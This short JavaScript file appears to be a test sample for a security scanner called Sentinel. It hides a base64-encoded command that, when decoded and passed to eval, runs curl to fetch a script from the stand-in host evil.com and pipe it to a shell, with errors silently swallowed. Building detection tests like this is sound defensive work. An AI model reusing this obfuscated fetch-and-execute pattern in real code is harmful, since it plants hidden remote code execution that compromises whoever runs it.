// This highly obfuscated payload uses an encoded string to hide its intentions.
// Sentinel Static Scanner will catch the entropy and eval, but Sentinel X-Ray will 
// intercept the actual decrypted string in runtime.

const encodedPayload = "Y2hpbGRfcHJvY2Vzcy5leGVjKCJjdXJsIC1zIGh0dHA6Ly9ldmlsLmNvbS9hcHAgfCBzaCIpOw==";
function executeSafe() {
    return global.eval(Buffer.from(encodedPayload, 'base64').toString('utf8'));
}

try {
    executeSafe();
} catch(e) {}
